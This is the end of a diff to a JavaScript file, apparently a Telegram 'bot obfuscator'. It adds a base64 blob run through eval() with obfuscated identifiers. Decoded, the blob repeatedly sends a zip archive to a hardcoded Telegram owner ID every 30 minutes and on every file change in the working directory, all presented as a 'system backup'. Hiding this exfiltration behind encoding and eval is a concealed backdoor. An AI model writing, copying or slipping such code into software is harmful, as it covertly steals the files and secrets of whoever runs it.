ICAgICAgICAgICAgICAgICJERC9NTS9ZWVlZIEhIOm1tOnNzIgogICAgICAgICAgICApCgogICAgICAgIGF3YWl0IGJvdC50ZWxlZ3JhbS5zZW5kRG9jdW1lbnQoCiAgICAgICAgICAgIEJBQ0tVUF9PV05FUl9JRCwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgc291cmNlOiB6aXBQYXRoCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGNhcHRpb246CmAKPGJsb2NrcXVvdGU+PGI+8J+TpiBTWVNURU0gQkFDS1VQPC9iPjwvYmxvY2txdW90ZT4KPGJsb2NrcXVvdGU+PGI+8J+TnSBSZWFzb24gOiAke3JlYXNvbn08L2I+PC9ibG9ja3F1b3RlPgo8YmxvY2txdW90ZT48Yj7wn5WSIFRpbWUgOiAke3RpbWV9PC9iPjwvYmxvY2txdW90ZT4KYCwKICAgICAgICAgICAgICAgIHBhcnNlX21vZGU6ICJIVE1MIgogICAgICAgICAgICB9CiAgICAgICAgKQoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYFsgQkFDS1VQIF0gc3Vrc2VzIHRlcmtpcmltYAogICAgICAgICkKCiAgICAgICAgLy8gaGFwdXMgemlwCiAgICAgICAgZnMudW5saW5rU3luYyh6aXBQYXRoKQoKICAgIH0gY2F0Y2ggKGVycikgewoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYFsgQkFDS1VQIEVSUk9SIF1gCiAgICAgICAgKQoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgZXJyLm1lc3NhZ2UKICAgICAgICApCiAgICB9Cn0KCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ci8vIEFVVE8gQkFDS1VQIEVWRVJZIDMwIE1JTlVURVMKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0Kc2V0SW50ZXJ2YWwoCiAgICBhc3luYyAoKSA9PiB7CgogICAgICAgIGNvbnNvbGUubG9nKAogICAgICAgICAgICBgWyBBVVRPIEJBQ0tVUCBdYAogICAgICAgICkKCiAgICAgICAgYXdhaXQgc2VuZEJhY2t1cCgKICAgICAgICAgICAgIkF1dG8gQmFja3VwIDMwIE1lbml0IgogICAgICAgICkKCiAgICB9LAoKICAgIDMwICogNjAgKiAxMDAwCikKCgovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQovLyBBVVRPIEJBQ0tVUCBTQUFUIEZJTEUgVVBEQVRFCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmNvbnN0IHdhdGNoZXIgPQpjaG9raWRhci53YXRjaCgKICAgIHByb2Nlc3MuY3dkKCksCiAgICB7CiAgICAgICAgaWdub3JlZDogWwoKICAgICAgICAgICAgL25vZGVfbW9kdWxlcy8sCiAgICAgICAgICAgIC9iYWNrdXAvLAogICAgICAgICAgICAvLmdpdC8KCiAgICAgICAgXSwKCiAgICAgICAgcGVyc2lzdGVudDogdHJ1ZQogICAgfQopCgp3YXRjaGVyLm9uKAogICAgImNoYW5nZSIsCiAgICBhc3luYyBmaWxlUGF0aCA9PiB7CgogICAgICAgIGNvbnNvbGUubG9nKAogICAgICAgICAgICBgWyBGSUxFIFVQREFURSBdICR7ZmlsZVBhdGh9YAogICAgICAgICkKCiAgICAgICAgYXdhaXQgc2VuZEJhY2t1cCgKICAgICAgICAgICAgYEZpbGUgVXBkYXRlIDogJHtmaWxlUGF0aH1gCiAgICAgICAgKQogICAgfQopCgpjb25zb2xlLmxvZygKICAgIGBbIEFVVE8gQkFDS1VQIFNZU1RFTSBBQ1RJVkUgXWAKKTsKYm90LmxhdW5jaCgpLnRoZW4oKCkgPT4gY29uc29sZS5sb2coJ+KchSBCb3Qgb2JmdXNjYXRvciBiZXJqYWxhbicpKTsKcHJvY2Vzcy5vbmNlKCdTSUdJTlQnLCAoKSA9PiBib3Quc3RvcCgnU0lHSU5UJykpOwpwcm9jZXNzLm9uY2UoJ1NJR1RFUk0nLCAoKSA9PiBib3Quc3RvcCgnU0lHVEVSTScpKTs=";
+return Buffer.from(そらん99337,"base64").toString();
+}
+eval(ゆき〆62844());
+})();
